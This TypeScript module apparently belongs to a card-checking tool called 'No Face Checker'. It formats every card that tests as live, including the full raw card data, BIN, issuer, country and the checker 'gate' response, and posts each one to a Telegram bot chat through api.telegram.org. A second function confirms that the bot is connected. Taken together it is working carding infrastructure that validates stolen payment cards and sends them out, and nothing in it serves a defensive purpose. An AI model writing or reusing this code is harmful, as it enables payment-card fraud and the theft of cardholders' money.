const TG_API = 'https://api.telegram.org/bot'

export interface LiveCardPayload {
  raw: string
  number: string
  bin: string
  brand: string
  bank: string
  country: string
  countryEmoji: string
  cardType: string
  cardCategory: string
  gateName: string
  message: string
  checkedAt: number
}

function escapeMd(text: string): string {
  return text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1')
}

function fmtCard(payload: LiveCardPayload): string {
  const lines = [
    `🚀 *LIVE CARD DETECTED*`,
    ``,
    `\`${escapeMd(payload.raw)}\``,
    ``,
    `── *GATE* ──`,
    `${escapeMd(payload.gateName)}`,
    ``,
    `── *BIN INFO* ──`,
    `BIN: \`${escapeMd(payload.bin)}\``,
    `Brand: ${escapeMd(payload.brand)}`,
    `Issuer: ${escapeMd(payload.bank)}`,
    `Country: ${payload.countryEmoji} ${escapeMd(payload.country)}`,
    `Type: ${escapeMd(payload.cardType)} · ${escapeMd(payload.cardCategory)}`,
    ``,
    `Response: ${escapeMd(payload.message)}`,
  ]
  return lines.join('\n')
}

export async function sendLiveCard(payload: LiveCardPayload, botToken: string, chatId: string): Promise<boolean> {
  if (!botToken || !chatId) return false

  const text = fmtCard(payload)
  const url = `${TG_API}${botToken}/sendMessage`

  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'MarkdownV2',
        disable_web_page_preview: true,
      }),
    })

    if (!res.ok) {
      const err = await res.json().catch(() => ({}))
      console.warn('[Telegram] Failed to send:', err)
      return false
    }
    return true
  } catch (err) {
    console.warn('[Telegram] Network error:', err)
    return false
  }
}

export async function testTelegramConnection(botToken: string, chatId: string): Promise<{ ok: boolean; error?: string }> {
  if (!botToken) return { ok: false, error: 'Bot token is empty' }
  if (!chatId) return { ok: false, error: 'Chat ID is empty' }

  try {
    const res = await fetch(`${TG_API}${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: '🟢 *No Face Checker* — Telegram bot connected successfully\\!',
        parse_mode: 'MarkdownV2',
      }),
    })
    if (!res.ok) {
      const err = await res.json().catch(() => ({}))
      return { ok: false, error: err?.description || `HTTP ${res.status}` }
    }
    return { ok: true }
  } catch (err) {
    return { ok: false, error: String(err) }
  }
}
